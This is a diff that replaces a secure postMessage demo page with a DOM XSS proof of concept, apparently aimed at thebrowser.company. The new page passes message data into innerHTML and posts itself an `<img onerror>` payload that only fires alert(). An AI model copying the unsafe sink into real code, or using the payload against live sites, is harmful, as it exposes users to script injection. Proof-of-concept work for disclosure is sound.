@@ -1,89 +1,53 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>⚠️ Security Demo: postMessage Handling</title>
-  <style>
-    body { 
-      font-family: 'Segoe UI', Arial, sans-serif; 
-      background: #f8f9fa; 
-      padding: 20px; 
-      line-height: 1.6;
-      max-width: 800px;
-      margin: 0 auto;
-    }
-    .demo-container {
-      background: #fff;
-      border-radius: 8px;
-      padding: 20px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    #output {
-      margin-top: 20px;
-      padding: 15px;
-      border: 1px solid #dee2e6;
-      border-radius: 4px;
-      background-color: #f8f9fa;
-      min-height: 50px;
-    }
-    .disclaimer {
-      background-color: #fff3cd;
-      border-left: 4px solid #ffc107;
-      padding: 15px;
-      margin-bottom: 20px;
-      border-radius: 4px;
-    }
-    code {
-      background: #e9ecef;
-      padding: 2px 4px;
-      border-radius: 3px;
-      font-family: monospace;
-    }
-  </style>
-</head>
-<body>
-  <div class="demo-container">
-    <div class="disclaimer">
-      <h3>⚠️ Security Demonstration Only</h3>
-      <p>This page demonstrates <strong>safe message handling concepts</strong> for educational purposes. Never test systems without authorization.</p>
-    </div>
-
-    <h1>🔍 postMessage Handling Demonstration</h1>
-    <p>This demo shows how messages should be securely processed.</p>
-
-    <div id="output">[Awaiting message...]</div>
-  </div>
-
-  <script>
-    // Secure message handler with input validation
-    window.addEventListener("message", (event) => {
-      const output = document.getElementById("output");
-      
-      // Always verify message structure
-      if (event.data?.message === "DEMO_MESSAGE") {
-        console.log("[Security] Received valid message format");
-        
-        // SECURE ALTERNATIVE: Use textContent instead of innerHTML
-        const safeContent = event.data.content?.demoText || "No content provided";
-        output.textContent = `Received: ${safeContent}`;
-        
-        // For educational purposes - show what unsafe handling might do
-        console.warn("[Security Note] In vulnerable code, this might be processed as HTML:", safeContent);
-      } else {
-        console.warn("[Security] Received unexpected message format");
-        output.textContent = "[Security] Unexpected message format received";
+  <head>
+    <title>🔥 XSS PoC - thebrowser.company</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        background: #f0f0f0;
+        padding: 30px;
       }
-    });
+      #output {
+        background: white;
+        padding: 20px;
+        border: 2px solid #888;
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>✅ DOM XSS PoC via postMessage</h1>
+    <p>Payload will be sent automatically, and injected here:</p>
 
-    // Send demo message (safe content)
-    window.onload = () => {
-      console.log("[Demo] Sending safe demonstration message...");
-      window.postMessage({
-        message: "DEMO_MESSAGE",
-        content: {
-          demoText: "This is a safe text message demonstration"
+    <div id="output">[ Waiting for message... ]</div>
+
+    <script>
+      // Step 1: Listen for postMessage
+      window.addEventListener("message", (event) => {
+        if (event.data?.message === "OB_SHOULD_SHOW_PICKER") {
+          const html = event.data.content?.marketerId?.[0];
+          if (html) {
+            console.log("📥 Received marketerId:", html);
+            document.getElementById("output").innerHTML = html;
+          }
         }
-      }, window.location.origin); // Restrict to same origin
-    };
-  </script>
-</body>
+      });
+
+      // Step 2: Auto-send payload after 1 second
+      window.onload = () => {
+        setTimeout(() => {
+          console.log("🚀 Sending XSS payload via postMessage...");
+          window.postMessage({
+            message: "OB_SHOULD_SHOW_PICKER",
+            content: {
+              marketerId: [
+                `<img src=x onerror="alert('🔥 XSS Executed in PoC')">`
+              ]
+            }
+          }, "*");
+        }, 1000);
+      };
+    </script>
+  </body>
 </html>
